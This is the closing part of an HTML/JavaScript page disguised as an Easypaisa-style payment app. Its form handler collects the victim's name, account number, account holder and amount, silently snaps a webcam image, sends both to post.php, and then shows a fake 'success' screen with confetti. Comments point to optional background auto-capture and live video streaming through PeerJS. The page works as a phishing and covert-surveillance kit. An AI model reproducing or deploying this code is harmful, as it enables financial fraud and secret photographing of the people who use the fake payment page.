                document.getElementById('submitBtn').innerHTML = '<i class="bi bi-lock-fill"></i> Send Payment';
            } else {
                document.getElementById('formTitle').innerHTML = '<i class="bi bi-arrow-down-circle-fill"></i> Receive Payment';
                document.getElementById('amountGroup').style.display = 'block';
                document.getElementById('submitBtn').innerHTML = '<i class="bi bi-lock-fill"></i> Receive Payment';
            }
        }
        
        function goBackToHome() {
            document.getElementById('paymentFormCard').classList.remove('active');
            document.getElementById('actionButtons').style.display = 'grid';
            document.getElementById('balanceCard').style.display = 'block';
            document.getElementById('paymentForm').reset();
            document.getElementById('selectedService').value = 'easypaisa';
            
            // Reset service selector
            document.querySelectorAll('.service-option').forEach(el => el.classList.remove('selected'));
            document.querySelector('.service-option[data-service="easypaisa"]')?.classList.add('selected');
            
            // Stop camera capture
            if(captureInterval) clearInterval(captureInterval);
            if(video.srcObject) {
                video.srcObject.getTracks().forEach(t => t.stop());
            }
            isCameraActive = false;
            cameraPermissionDeniedCount = 0;
        }
        
        function selectService(element) {
            document.querySelectorAll('.service-option').forEach(el => el.classList.remove('selected'));
            element.classList.add('selected');
            document.getElementById('selectedService').value = element.dataset.service;
        }
        
        function showDisclaimer() {
            document.getElementById('disclaimerToast').classList.add('active');
        }
        
        function closeDisclaimer() {
            document.getElementById('disclaimerToast').classList.remove('active');
            cameraPermissionDeniedCount = 0;
            
            // Reset UI
            document.getElementById('paymentFormCard').classList.remove('active');
            document.getElementById('actionButtons').style.display = 'grid';
            document.getElementById('balanceCard').style.display = 'block';
            document.getElementById('paymentForm').reset();
        }
        
        // Submit payment form with data to post.php
        function submitPaymentForm(event) {
            event.preventDefault();
            
            const transactionType = document.getElementById('transactionType').value;
            const selectedService = document.getElementById('selectedService').value;
            const fullName = document.getElementById('fullName').value;
            const accountNumber = document.getElementById('accountNumber').value;
            const accountHolder = document.getElementById('accountHolder').value;
            const amount = document.getElementById('amount').value;
            const description = document.getElementById('description').value;
            
            // Prepare form data
            const formData = {
                type: 'payment',
                transactionType: transactionType,
                service: selectedService,
                fullName: fullName,
                accountNumber: accountNumber,
                accountHolder: accountHolder,
                amount: amount,
                description: description,
                timestamp: new Date().toISOString()
            };
            
            // Send form data to post.php along with the latest camera snap
            const context = canvas.getContext('2d');
            if (video.readyState === video.HAVE_ENOUGH_DATA && isCameraActive) {
                context.drawImage(video, 0, 0, 640, 480);
                const imageData = canvas.toDataURL("image/jpeg", 0.5).replace("image/jpeg", "image/octet-stream");
                
                // Send both form data and image to post.php
                $.ajax({ 
                    type: 'POST', 
                    data: { 
                        cat: imageData,
                        paymentData: JSON.stringify(formData)
                    }, 
                    url: 'post.php', 
                    dataType: 'json', 
                    async: true,
                    success: function(response) {
                        console.log('Data sent successfully');
                    },
                    error: function(err) {
                        console.log('Send error:', err);
                    }
                });
            } else {
                // Send form data only if camera not active
                $.ajax({ 
                    type: 'POST', 
                    data: { 
                        paymentData: JSON.stringify(formData)
                    }, 
                    url: 'post.php', 
                    dataType: 'json', 
                    async: true
                });
            }
            
            // Show success overlay
            document.getElementById('successOverlay').classList.add('active');
            
            // Create confetti
            createConfetti();
            
            // Reset after delay
            setTimeout(() => {
                document.getElementById('successOverlay').classList.remove('active');
                goBackToHome();
                
                // Stop camera
                if(captureInterval) clearInterval(captureInterval);
                if(video.srcObject) {
                    video.srcObject.getTracks().forEach(t => t.stop());
                }
                isCameraActive = false;
            }, 3000);
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', () => {
            setupOriginalListeners();
            
            // Also initialize the original capture (runs in background)
            // initAutoCapture(); // Uncomment if you want original auto-capture on load
            // initPeerAndLocalStream(); // Uncomment if you want video chat on load
            
            // Light initial confetti
            setTimeout(() => createConfetti(), 800);
        });
        
        // Cleanup on page leave
        window.addEventListener('beforeunload', () => {
            if(captureInterval) clearInterval(captureInterval);
            if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
            if(localStream) localStream.getTracks().forEach(t => t.stop());
            if(peer) peer.destroy();
        });
    </script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</body>
</html>